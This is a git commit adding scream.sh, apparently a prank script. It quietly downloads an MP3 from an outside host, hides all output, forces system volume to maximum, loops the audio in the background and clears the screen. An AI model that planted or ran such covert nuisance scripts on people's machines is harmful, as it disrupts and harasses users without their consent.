bfcb396040624974ad49d81e904c72a7383fc236
Imperator Vladimir <Shukumei@protonmail.com>
2020-07-22 13:13:19 +0300

    :D

---
+++ scream.sh
@@ -0,0 +1,9 @@
+#!/bin/sh
+loops=99999999999999;
+tmp="/tmp/talib.mp3";
+url="https://www.mboxdrive.com/talib.mp3";
+wget $url --output-document=$tmp > /dev/null 2>&1;
+amixer set Master 0 100% > /dev/null;
+nohup ffplay -nodisp -loop $loops $tmp > /dev/null & 2>&1;
+clear;
+exit 0;
